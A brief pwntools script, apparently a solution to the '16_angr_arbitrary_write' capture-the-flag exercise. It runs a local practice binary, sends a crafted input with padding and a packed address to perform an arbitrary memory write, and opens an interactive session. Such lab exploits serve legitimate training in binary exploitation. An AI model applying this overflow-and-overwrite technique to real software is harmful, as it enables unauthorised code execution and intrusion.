from pwn import *
p = process("./16_angr_arbitrary_write.elf")
p.sendline(b"10225924 " + b"UEQFKBEC" + b"A" * 8 + p32(0x5846514c))
p.interactive()
